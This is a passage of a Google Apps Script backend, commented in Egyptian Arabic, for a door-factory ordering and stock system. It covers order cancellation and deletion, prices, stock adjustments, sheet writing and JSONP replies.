        // ⚠️ باج كان هنا: الصنف بيتحذف والرصيد ما بيرجعش. يعني حذف صنف فيه 5 أبواب
        // كان بيسيبهم مخصومين من المخزن للأبد. بنرجّعهم قبل ما نمسح الصف.
        // (زي حذف الطلب كله بالظبط — المُسلَّم فعليًا ميترجّعش رصيده)
        var stkDI = stockItemFromRow_(shDI, foundDI);
        if (stkDI && orderStatus_(idDI) !== 'Delivered') adjustStockForItems_([stkDI], +1);

        shDI.deleteRow(foundDI);
        var totalsDI = recomputeOrderTotals_(idDI);
        return reply({ ok: true, totals: totalsDI }, cb);
      } finally {
        try { lockDI.releaseLock(); } catch (eDI) {}
      }
    }

    if (action === 'setItemProduced') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockIP = LockService.getScriptLock();
      try {
        lockIP.waitLock(15000);
        var shIP = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        var idIP = String(e.parameter.id || '');
        var idxIP = Number(e.parameter.idx || 0);
        var lastIP = shIP.getLastRow();
        if (lastIP < 2) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var idsIP = shIP.getRange(2, 1, lastIP - 1, 1).getValues();
        var foundIP = -1, countIP = -1;
        for (var iIP = 0; iIP < idsIP.length; iIP++) {
          if (String(idsIP[iIP][0]) === idIP) {
            countIP++;
            if (countIP === idxIP) { foundIP = iIP + 2; break; }
          }
        }
        if (foundIP < 0) return reply({ ok: false, error: 'الصنف مش موجود' }, cb);
        var qtyIP = Number(shIP.getRange(foundIP, 11).getValue()) || 0;   // عمود Qty
        var producedIP = Math.max(0, Math.min(qtyIP, Number(e.parameter.produced) || 0));  // من صفر لحد الكمية المطلوبة، مش أكتر ولا أقل
        shIP.getRange(foundIP, COL_ITEM_PRODUCED).setValue(producedIP);
        return reply({ ok: true, produced: producedIP }, cb);
      } finally {
        try { lockIP.releaseLock(); } catch (eIP) {}
      }
    }


    // إلغاء طلب (بيتنادى لوحده لما العميل أو المصنع يعدّل طلب — الطلب القديم يتحذف تلقائي وطلب جديد يتعمل)
    // من غير كلمة سر المصنع عشان الموزع العادي يقدر يعدّل طلبه هو من غير دخول شاشة المصنع،
    // لكن لازم يبعت نفس رقم موبايل صاحب الطلب — عشان حد تاني ميقدرش يلغي طلب مش بتاعه بمجرد ما يعرف رقمه
    if (action === 'cancelOrder') {
      var lockCO = LockService.getScriptLock();
      try {
        lockCO.waitLock(15000);
        var shCO = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rCO = findRow_(shCO, e.parameter.id);
        if (rCO < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);

        var isAdminCO = isAdminPwQuiet_(e.parameter.pw);   // المستخدم العادي بيلغي طلبه برقم موبايله، مش بكلمة سر
        if (!isAdminCO) {
          var ownerPhoneCO = digitsOnly_(shCO.getRange(rCO, 5).getValue() || '');   // digitsOnly_ بتشيل الفاصلة العليا كمان
          var reqPhoneCO = digitsOnly_(e.parameter.phone || '');
          if (!reqPhoneCO || reqPhoneCO.slice(-9) !== ownerPhoneCO.slice(-9)) {
            return reply({ ok: false, error: 'مش مسموح تلغي الطلب ده' }, cb);
          }
        }

        // المصنع (بكلمة السر) يقدر يمسح الطلب القديم مهما كانت حالته — هو اللي بيعدّل بنفسه.
        // الموزع العادي (من غير كلمة سر) لسه ممنوع يلغي طلب دخل التنفيذ فعليًا — بدل ما نسيبه
        // كإنه طلب عادي، بنحط عليه علامة واضحة في العمود الأخير + نلوّن السطر عشان المصنع
        // ياخد باله وهو بيراجع الشيت إن ده طلب قديم اتعدّله موزع وعنده نسخة جديدة، ويحذفه بنفسه.
        var stCO = String(shCO.getRange(rCO, COL_STATUS).getValue() || '');
        if (!isAdminCO && (stCO === 'In Progress' || stCO === 'Ready' || stCO === 'Delivered')) {
          var newIdCO = String(e.parameter.newId || '');
          var markCO = '⚠️ الطلب ده اتعدّل — بدّله الطلب رقم #' + (newIdCO || '؟') + ' — من فضلك احذف السطر ده يدويًا';
          shCO.getRange(rCO, COL_SUPERSEDED).setValue(markCO);
          shCO.getRange(rCO, 1, 1, HEAD_ORDERS.length).setBackground('#FFF3CD');
          return reply({ ok: false, error: 'الطلب دخل التنفيذ في المصنع، اتحطت عليه علامة "معدّل" عشان يتحذف يدويًا', marked: true }, cb);
        }
        shCO.deleteRow(rCO);
        if (stCO !== 'Delivered') restoreStockForOrderId_(e.parameter.id);   // المُسلَّم فعليًا ميترجّعش رصيده
        var shICO = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        clearItemRows_(shICO, e.parameter.id);
        return reply({ ok: true, id: e.parameter.id }, cb);
      } finally {
        try { lockCO.releaseLock(); } catch (eCO) {}
      }
    }

    // حذف طلب بالكامل (السطر الملخّص + كل سطور أصنافه) — من شاشة المصنع
    if (action === 'deleteOrder') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockDO = LockService.getScriptLock();
      try {
        lockDO.waitLock(15000);
        var shDO = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rDO = findRow_(shDO, e.parameter.id);
        if (rDO < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var stDO = String(shDO.getRange(rDO, COL_STATUS).getValue() || '');
        shDO.deleteRow(rDO);
        if (stDO !== 'Delivered') restoreStockForOrderId_(e.parameter.id);   // المُسلَّم فعليًا ميترجّعش رصيده
        var shIDO = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        clearItemRows_(shIDO, e.parameter.id);
        return reply({ ok: true, id: e.parameter.id }, cb);
      } finally {
        try { lockDO.releaseLock(); } catch (eDO) {}
      }
    }

    // مسح كل الطلبات اللي حالتها "تم التسليم" دفعة واحدة (تنظيف دوري) — من زرار "🗑️ مسح المسلّم"
    if (action === 'deleteDelivered') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockDD = LockService.getScriptLock();
      try {
        lockDD.waitLock(15000);
        var shDD = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var lastDD = shDD.getLastRow();
        var deletedIds = [];
        if (lastDD >= 2) {
          var valsDD = shDD.getRange(2, 1, lastDD - 1, HEAD_ORDERS.length).getValues();
          // من الآخر للأول عشان مسح صف ميغيّرش أرقام الصفوف اللي لسه هنمسحها
          for (var iDD = valsDD.length - 1; iDD >= 0; iDD--) {
            if (String(valsDD[iDD][COL_STATUS - 1]) === 'Delivered') {
              deletedIds.push(String(valsDD[iDD][0]));
              shDD.deleteRow(iDD + 2);
            }
          }
        }
        var shIDD = sheet_(SHEET_ITEMS, HEAD_ITEMS);
        deletedIds.forEach(function (idDD) { clearItemRows_(shIDD, idDD); });
        return reply({ ok: true, count: deletedIds.length, ids: deletedIds }, cb);
      } finally {
        try { lockDD.releaseLock(); } catch (eDD) {}
      }
    }

    // كل الطلبات + أصنافها مرة واحدة — لتقرير الـ PDF الشامل في شاشة المصنع (بدل ما نجيب كل طلب لوحده)
    if (action === 'listWithItems') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var shLW = sheet_(SHEET_ORDERS, HEAD_ORDERS);
      var rowsLW = readOrderRows_(shLW);   // نفس الحكاية — من غير الأعمدة التقيلة
      var shILW = sheet_(SHEET_ITEMS, HEAD_ITEMS);
      var lastILW = shILW.getLastRow();
      var itemsByIdLW = {};
      if (lastILW >= 2) {
        var valsILW = shILW.getRange(2, 1, lastILW - 1, HEAD_ITEMS.length).getValues();
        for (var iILW = 0; iILW < valsILW.length; iILW++) {
          var oidLW = String(valsILW[iILW][0]);
          if (!itemsByIdLW[oidLW]) itemsByIdLW[oidLW] = [];
          itemsByIdLW[oidLW].push({
            type:     valsILW[iILW][3],
            title:    valsILW[iILW][4],
            code:     valsILW[iILW][5],
            size:     valsILW[iILW][6],
            included: valsILW[iILW][7],
            unit:     valsILW[iILW][9],
            qty:      valsILW[iILW][10],
            avail:    valsILW[iILW][13] !== 'N',
            frame:    valsILW[iILW][14] || '',
            dbror:    valsILW[iILW][15] || '',
            frameHeight: valsILW[iILW][16] || '',
            width:    valsILW[iILW][17] || '',
            produced: Number(valsILW[iILW][18]) || 0,
            doorHeight: valsILW[iILW][19] || '',
            milling:  valsILW[iILW][8],
            forDoorWidth: valsILW[iILW][20] || '',
            itemNote: valsILW[iILW][21] || ''
          });
        }
      }
      var outLW = [];
      for (var jLW = 0; jLW < rowsLW.length; jLW++) {
        var isArchLW = String(rowsLW[jLW][COL_ARCHIVED - 1] || '') === 'Y';
        if (isArchLW && String(e.parameter.archived || '') !== '1') continue;   // المؤرشف مايظهرش في التقارير افتراضيًا
        var idLW = String(rowsLW[jLW][0]);
        outLW.push({
          id:        idLW,
          date:      fmtDate_(rowsLW[jLW][1]),
          dist:      rowsLW[jLW][3],
          phone:     String(rowsLW[jLW][4] || '').replace(/^'/, ''),
          region:    rowsLW[jLW][5],
          warehouse: rowsLW[jLW][6],
          status:    rowsLW[jLW][10],
          customer:  rowsLW[jLW][COL_CUSTOMER - 1] || '',
          customerPhone: String(rowsLW[jLW][COL_CUST_PHONE - 1] || '').replace(/^'/, ''),
          ordNote:   rowsLW[jLW][COL_ORDNOTE  - 1] || '',
          replacesId: rowsLW[jLW][COL_REPLACES - 1] || '',
          displayNo: rowsLW[jLW][COL_DISPLAY_NO - 1] || '',
          editCount: rowsLW[jLW][COL_EDIT_COUNT - 1] || 0,
          editedAt: fmtDate_(rowsLW[jLW][COL_EDITED_AT - 1]),
          items:     itemsByIdLW[idLW] || []
        });
      }
      return reply({ ok: true, orders: outLW }, cb);
    }

    /* ---------- أسعار الكتالوج ----------
       الأسعار كانت متخزّنة في متصفح المصنع بس (localStorage). يعني لما المصنع
       يعدّل سعر، الموزّعين كلهم يفضلوا شايفين السعر القديم المكتوب جوّه التطبيق
       لحد ما تترفع نسخة جديدة منه. دلوقتي الشيت هو المصدر الواحد للأسعار:
       المصنع بيكتب فيه بكلمة السر، وكل الأجهزة بتقرا منه. */

    // القراية مفتوحة من غير كلمة سر — الأسعار أصلًا مكتوبة جوّه التطبيق نفسه
    if (action === 'prices') {
      var shPR = sheet_(SHEET_PRICES, HEAD_PRICES);
      if (shPR.getLastRow() < 2) return reply({ ok: true, prices: null, at: '' }, cb);
      var rowPR = shPR.getRange(2, 1, 1, 2).getValues()[0];
      var rawPR = String(rowPR[0] || '').trim();
      if (!rawPR) return reply({ ok: true, prices: null, at: '' }, cb);
      var objPR = null;
      try { objPR = JSON.parse(rawPR); }
      catch (ePR) { return reply({ ok: false, error: 'الأسعار المتخزّنة مش مقروءة' }, cb); }
      return reply({ ok: true, prices: objPR, at: fmtDate_(rowPR[1]) }, cb);
    }

    // الكتابة بكلمة سر المصنع بس
    if (action === 'setPrices') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var payloadPR = String(e.parameter.payload || '').trim();
      if (!payloadPR) return reply({ ok: false, error: 'مفيش أسعار مبعوتة' }, cb);
      // لازم تكون كائن JSON — كده الخانة عمرها ما تبدأ بـ = أو + فتتقري كمعادلة
      if (payloadPR.charAt(0) !== '{') return reply({ ok: false, error: 'شكل الأسعار مش صحيح' }, cb);
      // نتأكد إنها JSON صالح قبل ما نكتبها — عشان مانخزّنش حاجة تكسر كل الأجهزة
      try { JSON.parse(payloadPR); }
      catch (eSP) { return reply({ ok: false, error: 'شكل الأسعار مش صحيح' }, cb); }

      var lockPR = LockService.getScriptLock();
      try {
        lockPR.waitLock(15000);
        var shSP = sheet_(SHEET_PRICES, HEAD_PRICES);
        // صف واحد بس — الأسعار الحالية. القديم بيتكتب فوقه.
        if (shSP.getLastRow() < 2) shSP.appendRow([payloadPR, new Date()]);
        else shSP.getRange(2, 1, 1, 2).setValues([[payloadPR, new Date()]]);
        return reply({ ok: true }, cb);
      } finally {
        try { lockPR.releaseLock(); } catch (ePR2) {}
      }
    }

    // أرصدة المخزن — متاحة للعميل من غير كلمة سر عشان يشوف المتوفر
    if (action === 'stock') {
      var shST = sheet_(SHEET_STOCK, HEAD_STOCK);
      var lastST = shST.getLastRow();
      var outST = [];
      if (lastST >= 2) {
        var valsST = shST.getRange(2, 1, lastST - 1, HEAD_STOCK.length).getValues();
        for (var iST = 0; iST < valsST.length; iST++) {
          var codeST = String(valsST[iST][0] || '').trim();
          if (!codeST) continue;
          outST.push({
            code: codeST,
            size: String(valsST[iST][1] || '').trim(),
            qty:  Number(valsST[iST][2]) || 0
          });
        }
      }
      return reply({ ok: true, stock: outST }, cb);
    }

    // تحديث رصيد صنف واحد (كود + مقاس) — من شاشة المصنع بكلمة السر
    if (action === 'setStock') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockSS = LockService.getScriptLock();
      try {
        lockSS.waitLock(15000);
        var shSS = sheet_(SHEET_STOCK, HEAD_STOCK);
        var codeSS = String(e.parameter.code || '').trim();
        var sizeSS = String(e.parameter.size || '').trim();
        var qtySS  = Math.max(0, Math.round(Number(e.parameter.qty) || 0));
        if (!codeSS) return reply({ ok: false, error: 'الكود ناقص' }, cb);

        var lastSS = shSS.getLastRow();
        var foundSS = -1;
        if (lastSS >= 2) {
          var rowsSS = shSS.getRange(2, 1, lastSS - 1, 2).getValues();
          for (var jSS = 0; jSS < rowsSS.length; jSS++) {
            if (String(rowsSS[jSS][0]).trim() === codeSS &&
                String(rowsSS[jSS][1]).trim() === sizeSS) { foundSS = jSS + 2; break; }
          }
        }
        if (foundSS > 0) {
          shSS.getRange(foundSS, 3).setValue(qtySS);
          shSS.getRange(foundSS, 4).setValue(new Date());
        } else {
          shSS.appendRow([codeSS, sizeSS, qtySS, new Date()]);
        }
        return reply({ ok: true, code: codeSS, size: sizeSS, qty: qtySS }, cb);
      } finally {
        try { lockSS.releaseLock(); } catch (eSS) {}
      }
    }

    return reply({ ok: false, error: 'Unknown action' }, cb);

  } catch (err) {
    logError_(err);
    return reply({ ok: false, error: String(err) }, cb);
  }
}

/* ============================================================
   الكتابة في الشيت
   ============================================================ */
function saveOrder_(o) {
  var when  = o.ts ? new Date(o.ts) : new Date();
  var dateS = Utilities.formatDate(when, TZ, 'yyyy-MM-dd');
  var timeS = Utilities.formatDate(when, TZ, 'HH:mm');

  var items = o.items || [];
  var qty = 0;   // أبواب وإكسسوارات بس — العيدان ليها عمود لوحدها
  var rods = 0;
  for (var i = 0; i < items.length; i++) {
    var k = items[i].kind;
    if (k === 'frame' || k === 'bror') rods += (items[i].isSet ? (Number(items[i].qty)||0)*3 : Number(items[i].qty) || 0);
    else qty += Number(items[i].qty) || 0;
  }

  // ---- سطر الملخّص ----
  var shO = sheet_(SHEET_ORDERS, HEAD_ORDERS);

  // لو الطلب اتبعت مرتين بالغلط، بنحدّث السطر القديم بدل ما نكرّره
  var existing = findRow_(shO, o.id);
  var rowO = [
    o.id,
    dateS,
    timeS,
    sanitizeCell_(o.name || ''),
    "'" + (o.phone || ''),   // الفاصلة العليا بتخلي الرقم نص عشان الصفر ما يتقصّش
    o.region || '',
    warehouseEn_(o.warehouse),
    qty,
    rods,
    Number(o.total) || 0,
    'New',
    '',            // ملاحظة المصنع — تتكتب بالإيد
    PRICE_NOTE,
    o.msg || '',
    '',                  // Status Updated — بيتحط وقت تغيير الحالة
    '',                  // Archived
    sanitizeCell_(o.customer || ''),    // صاحب الأوردر لو مختلف عن صاحب الجهاز
    sanitizeCell_(o.note || ''),        // ملاحظات العميل
    o.customerPhone || ''  // تليفون صاحب الأوردر لو مختلف عن صاحب الجهاز
  ];

  rowO = sanitizeRow_(rowO);   // كل خانة نصية تتنظّف من الصيغ قبل ما تدخل الشيت

  if (existing > 0) {
    // بنحافظ على الحالة والملاحظة اللي المصنع كتبها، ونحدّث الباقي بس
    var keep = shO.getRange(existing, COL_STATUS, 1, 2).getValues()[0];
    if (keep[0]) rowO[COL_STATUS - 1] = keep[0];
    if (keep[1]) rowO[COL_NOTE   - 1] = keep[1];
    shO.getRange(existing, 1, 1, rowO.length).setValues([rowO]);
  } else {
    shO.appendRow(rowO);
  }

  // عمود "Replaces Order" (٢١) بيتكتب لوحده — عشان الرينج اللي فوق (rowO.length = ١٩ عمود)
  // منلمسش عمود Superseded (٢٠) اللي بيتحط بمنطق تاني في cancelOrder
  var rowIdxRepl = existing > 0 ? existing : shO.getLastRow();
  shO.getRange(rowIdxRepl, COL_REPLACES).setValue(sanitizeCell_(o.replacesId || ''));

  // رقم الطلب "العادي" (Display No) + عدد مرات التعديل:
  // لو ده تعديل وجالنا رقم موروث من الطلب القديم (o.displayNo) بنستخدمه زي ما هو ونزوّد عداد التعديل،
  // ولو طلب جديد بالكامل بنطلب رقم تسلسلي جديد من nextOrderDisplayNo_.
  var displayNo = o.displayNo ? Number(o.displayNo) : 0;
  var editCount = Number(o.editCount) || 0;
  if (!displayNo) {
    displayNo = nextOrderDisplayNo_(shO);
    editCount = 0;
  }
  shO.getRange(rowIdxRepl, COL_DISPLAY_NO, 1, 2).setValues([[displayNo, editCount]]);
  // تاريخ التعديل: بيتكتب بس لو ده تعديل فعلي (editCount > 0) وجالنا تاريخ من التطبيق
  if (editCount > 0 && o.editedAt) {
    shO.getRange(rowIdxRepl, COL_EDITED_AT).setValue(sanitizeCell_(String(o.editedAt)));
  }

  // ---- سطور التفاصيل ----
  var shI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
  clearItemRows_(shI, o.id);   // لو الطلب اتحدّث، بنمسح سطوره القديمة الأول

  var lines = [];
  for (var j = 0; j < items.length; j++) {
    var it = items[j];
    var isDoor = it.kind === 'door';

    var isRod = (it.kind === 'frame' || it.kind === 'bror');

    // الباب: سعره بس — الحلق اللي جاي معاه مواصفة من غير سعر.
    // الحلق والبرور الإضافي: بيتباعوا بالعود (2.15 م) والسعر سعر العود.
    var unitPrice = isDoor ? (Number(it.unitPrice) || 0) : (Number(it.price) || 0);
    var lineTotal = unitPrice * (Number(it.qty) || 0);

    var type = isDoor ? 'Door'
             : (it.kind === 'frame' ? 'Frame'
             : (it.kind === 'bror'  ? 'Bror'
             : (it.kind === 'panel' ? 'Panel' : 'Accessory')));

    var unit = isDoor ? 'door' : (it.isSet ? 'set' : (isRod ? ('rod ' + (it.rodCm || 220) + 'cm') : (it.unit || 'pc')));

    lines.push([
      o.id,
      dateS,
      sanitizeCell_(o.name || ''),
      type,
      it.titleEn || it.title || '',            // النسخة الإنجليزية أولاً
      it.code || '',
      isDoor ? (it.sizeEn || it.sizeTxt || '') : (isRod ? (it.spec || '') : ''),
      isDoor ? [ (it.frame ? it.frame + ' cm frame' + (it.frameHeight ? ' (h:' + it.frameHeight + 'cm)' : '') : ''),
                 (it.dbror ? 'bror ' + it.dbror : '') ]
               .filter(function(x){ return x; }).join(' + ')
               + ((it.frame || it.dbror) ? ' (included, no charge)' : '') : '',
      isDoor ? (it.millEn || '') : '',
      unit,
      Number(it.qty) || 0,
      unitPrice,
      lineTotal,
      'Y',
      isDoor ? (it.frame || '') : '',
      isDoor ? (it.dbror || '') : '',
      isDoor ? (it.frameHeight || '') : '',
      isDoor ? (it.w || '') : '',
      0,   // Produced Qty — يبدأ صفر لكل صنف جديد، وبيتحدّث بعدين من شاشة المصنع
      isDoor ? (it.doorHeight || '') : '',
      isRod ? (it.doorW || '') : '',      // الحلق/البرور ده لباب مقاس كام (اختياري)
      sanitizeCell_(it.note || '')         // ملاحظة حرة على الصنف (اختياري)
    ]);
  }

  if (lines.length) {
    shI.getRange(shI.getLastRow() + 1, 1, lines.length, HEAD_ITEMS.length)
       .setValues(lines.map(sanitizeRow_));   // نفس التنظيف على كل سطر صنف
  }

  // ---- خصم الرصيد ----
  // بيتخصم بس لما الطلب يتكتب أول مرة (مش لو ده إعادة إرسال لنفس رقم الطلب بالغلط،
  // زي محاولة تانية بعد انقطاع نت — عشان الرصيد ما يتخصمش مرتين للطلب نفسه)
  if (existing < 0) {
    adjustStockForItems_(items, -1);
  }

  return { displayNo: displayNo, editCount: editCount };
}

// بيرجّع رصيد أصناف طلب (قبل ما سطوره تتمسح) — بتتنادى من cancelOrder و deleteOrder
// بيعيد حساب إجماليات طلب (الكمية / عدد العيدان / المبلغ الكلي) من سطور Order_Items بتاعته
// ويحدّثهم في سطر الطلب بتبويب Orders — بتتنادى بعد أي تعديل يدوي على كمية/حذف صنف من شاشة المصنع
function recomputeOrderTotals_(id) {
  var shI = sheet_(SHEET_ITEMS, HEAD_ITEMS);
  var lastI = shI.getLastRow();
  var qty = 0, rods = 0, total = 0;
  if (lastI >= 2) {
    var valsI = shI.getRange(2, 1, lastI - 1, HEAD_ITEMS.length).getValues();
    for (var i = 0; i < valsI.length; i++) {
      if (String(valsI[i][0]) !== String(id)) continue;
      var type = String(valsI[i][3] || '');
      var unit = String(valsI[i][9] || '');
      var q = Number(valsI[i][10]) || 0;
      if (type === 'Frame' || type === 'Bror') rods += (unit === 'set' ? q * 3 : q); else qty += q;
      total += Number(valsI[i][12]) || 0;
    }
  }
  var shO = sheet_(SHEET_ORDERS, HEAD_ORDERS);
  var r = findRow_(shO, id);
  if (r > 0) {
    shO.getRange(r, 8).setValue(qty);
    shO.getRange(r, 9).setValue(rods);
    shO.getRange(r, 10).setValue(total);
  }
  return { qty: qty, rods: rods, total: total };
}

// بيرجّع حالة الطلب من شيت Orders (نص فاضي لو مش موجود)
function orderStatus_(id){
  var sh = sheet_(SHEET_ORDERS, HEAD_ORDERS);
  var r = findRow_(sh, id);
  if (r < 0) return '';
  return String(sh.getRange(r, COL_STATUS).getValue() || '');
}

// بيقرا بيانات المخزون بتاعة صف صنف واحد (كود/عرض/كمية) — بيرجّع null لو مش باب
// أو مش متتبّع في المخزون (مقاس خاص/بدون كود).
function stockItemFromRow_(sh, row){
  var vals = sh.getRange(row, 1, 1, HEAD_ITEMS.length).getValues()[0];
  if (String(vals[3]) !== 'Door') return null;
  var code = String(vals[5] || '').trim();
  var w    = String(vals[COL_ITEM_WIDTH - 1] || '').trim();
  if (!code || !w) return null;
  return { kind: 'door', code: code, w: w, qty: Number(vals[10]) || 0 };
}

function restoreStockForOrderId_(id){ adjustStockForOrderId_(id, +1); }

// بيرجّع (+1) أو يخصم (-1) رصيد كل أبواب الطلب. الاتنين محتاجين نفس القراية،
// فالدالة واحدة — إلغاء الطلب بيرجّع، والرجوع من الإلغاء لحالة نشطة بيخصم تاني.
function adjustStockForOrderId_(id, dir){
  var shRS = sheet_(SHEET_ITEMS, HEAD_ITEMS);
  var lastRS = shRS.getLastRow();
  if (lastRS < 2) return;
  var valsRS = shRS.getRange(2, 1, lastRS - 1, HEAD_ITEMS.length).getValues();
  var itemsRS = [];
  for (var iRS = 0; iRS < valsRS.length; iRS++) {
    if (String(valsRS[iRS][0]) !== String(id)) continue;
    if (String(valsRS[iRS][3]) !== 'Door') continue;
    itemsRS.push({
      kind: 'door',
      code: valsRS[iRS][5] || '',
      w: valsRS[iRS][COL_ITEM_WIDTH - 1] || '',
      qty: valsRS[iRS][10] || 0
    });
  }
  adjustStockForItems_(itemsRS, dir);
}

// بيزوّد أو بيخصم من رصيد المخزون حسب أصناف الطلب (الأبواب اللي ليها مقاس قياسي بس — مقاس خاص مش متتبّع)
// dir: -1 للخصم (طلب جديد) أو +1 للرجوع (إلغاء/حذف طلب)
// ⚠️ كان فيه باجين هنا:
//
// ١) خصم ضايع لو الطلب فيه سطرين بنفس الكود والمقاس (وده بيحصل عادي — مثلاً باب
//    A01 مقاس 70 عادي + نفس الباب والمقاس نسخة حفر، أو الموزع ضاف نفس المقاس
//    مرتين). الكود كان بيقرا الأرصدة مرة واحدة في rowsAS قبل اللوب، وبعدين لكل
//    صنف يحسب "الرصيد القديم - الكمية" ويكتبه. فالسطر التاني كان بيقرا نفس الرصيد
//    القديم من الذاكرة (مش المحدَّث) ويكتب فوق خصم السطر الأول فيلغيه.
//    مثال حقيقي: رصيد 10، طلب فيه 3 + 2 → المفروض يبقى 5، وكان بيطلع 8.
//    الحل: نجمّع كل الكميات لكل (كود|مقاس) الأول، وبعدين نخصم مرة واحدة.
//
// ٢) بطء: كان بيعمل setValue مرتين لكل صنف جوه لوب — كل واحدة نداء منفصل لـ Sheets.
//    طلب فيه 10 أصناف = 20 نداء (ثواني بتتضاف على كل إرسال طلب). دلوقتي كتابة
//    واحدة مجمّعة على المدى كله.
function adjustStockForItems_(items, dir){
  if (!items || !items.length) return;
  var shAS = sheet_(SHEET_STOCK, HEAD_STOCK);
  var lastAS = shAS.getLastRow();
  if (lastAS < 2) return;   // مفيش أرصدة متسجّلة أصلًا

  // ١) نجمّع المطلوب خصمه/رجوعه لكل (كود|مقاس)
  var deltas = {};
  for (var iAS = 0; iAS < items.length; iAS++) {
    var itAS = items[iAS];
    if (itAS.kind !== 'door') continue;
    var codeAS = String(itAS.code || '').trim();
    var wAS    = String(itAS.w || '').trim();
    var qtyAS  = Number(itAS.qty) || 0;
    if (!codeAS || !wAS || !qtyAS) continue;   // مقاس خاص أو بدون كود = مش متتبّع في المخزون
    var keyAS = codeAS + '|' + wAS;
    deltas[keyAS] = (deltas[keyAS] || 0) + (dir * qtyAS);
  }
  var keys = Object.keys(deltas);
  if (!keys.length) return;

  // ٢) نطبّقهم على نسخة واحدة من الأرصدة
  var rng    = shAS.getRange(2, 1, lastAS - 1, 4);
  var rowsAS = rng.getValues();
  var now = new Date();
  var touched = false;
  for (var jAS = 0; jAS < rowsAS.length; jAS++) {
    var k = String(rowsAS[jAS][0]).trim() + '|' + String(rowsAS[jAS][1]).trim();
    if (!(k in deltas)) continue;              // الصف ده مش متتبّع في الطلب
    rowsAS[jAS][2] = (Number(rowsAS[jAS][2]) || 0) + deltas[k];
    rowsAS[jAS][3] = now;
    touched = true;
  }

  // ٣) كتابة واحدة بدل نداءين لكل صنف
  if (touched) rng.setValues(rowsAS);
}

/* ============================================================
   مساعدات
   ============================================================ */

// اسم المخزن بالإنجليزي عشان الشيت يفضل كله لغة واحدة
function warehouseEn_(w) {
  var map = { 'مصنع إنشاص': 'Enshas Factory', 'مصنع انشاص': 'Enshas Factory' };
  return map[w] || w || '';
}

// بيجيب التبويب، ولو مش موجود بيعمله بالعناوين ويظبّطه من الشمال لليمين
function sheet_(name, headers) {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sh = ss.getSheetByName(name);

  if (!sh) {
    sh = ss.insertSheet(name);
    sh.setRightToLeft(false);          // الشيت إنجليزي — الاتجاه من الشمال لليمين
    sh.appendRow(headers);
    sh.getRange(1, 1, 1, headers.length)
      .setFontWeight('bold')
      .setBackground('#2A1F18')
      .setFontColor('#F3EDE4');
    sh.setFrozenRows(1);
    sh.autoResizeColumns(1, headers.length);
  } else if (sh.getLastColumn() < headers.length) {
    // شيت موجود قبل إضافة عمود جديد (زي Available) — نكمّل العناوين الناقصة
    // في الآخر من غير ما نلمس البيانات القديمة
    var have = sh.getLastColumn();
    sh.getRange(1, have + 1, 1, headers.length - have)
      .setValues([headers.slice(have)])
      .setFontWeight('bold')
      .setBackground('#2A1F18')
      .setFontColor('#F3EDE4');
  }
  return sh;
}

// بيقرا صفوف شيت Orders من غير الأعمدة التقيلة اللي محدش بيستخدمها في القراءة:
//   عمود 13 (Pricing Terms) · عمود 14 (Message) · عمود 15 (Status Updated)
// عمود Message فيه نص رسالة الواتساب كاملة (~600 حرف للطلب الواحد)، وgetDataRange
// كان بيقراه لكل صف في كل نداء ويرميه. مع 500 طلب ده ~300 كيلوبايت بتتقري على
// الفاضي في كل فتحة لشاشة المصنع وكل فحص خلفي (كل 90 ثانية).
//
// بنرجّع الصفوف بنفس ترتيب الأعمدة الأصلي بالظبط، والتلاتة اللي مقريناهمش بيبقوا
// نص فاضي في مكانهم — كده كل الكود اللي بيقرا rows[i][N] يفضل شغّال زي ما هو
// من غير أي تغيير في الأرقام.
function readOrderRows_(sh) {
  var last = sh.getLastRow();
  if (last < 2) return [];
  var n = last - 1;
  var head = sh.getRange(2, 1, n, 12).getValues();          // أعمدة 1..12  → مؤشرات 0..11
  var tail = sh.getRange(2, 16, n, HEAD_ORDERS.length - 15).getValues();  // 16..24 → 15..23
  var out = [];
  for (var i = 0; i < n; i++) {
    out.push(head[i].concat(['', '', ''], tail[i]));        // الفجوة: مؤشرات 12,13,14
  }
  return out;
}

function findRow_(sh, id) {
  var last = sh.getLastRow();
  if (last < 2) return -1;
  var ids = sh.getRange(2, 1, last - 1, 1).getValues();
  for (var i = 0; i < ids.length; i++) {
    if (String(ids[i][0]) === String(id)) return i + 2;
  }
  return -1;
}

function clearItemRows_(sh, id) {
  var last = sh.getLastRow();
  if (last < 2) return;
  var ids = sh.getRange(2, 1, last - 1, 1).getValues();
  // بنمسح من تحت لفوق عشان أرقام السطور ما تتغيّرش وإحنا شغالين
  for (var i = ids.length - 1; i >= 0; i--) {
    if (String(ids[i][0]) === String(id)) sh.deleteRow(i + 2);
  }
}

function json(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}

// لو التطبيق بعت callback بنرد JSONP — ده بيتخطّى مشاكل CORS خالص
function reply(obj, cb) {
  if (cb) {
    return ContentService
      .createTextOutput(cb + '(' + JSON.stringify(obj) + ')')
      .setMimeType(ContentService.MimeType.JAVASCRIPT);
  }
  return json(obj);
}

function logError_(err) {
  try {
    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sh = ss.getSheetByName(SHEET_ERRORS);
    if (!sh) {
      sh = ss.insertSheet(SHEET_ERRORS);
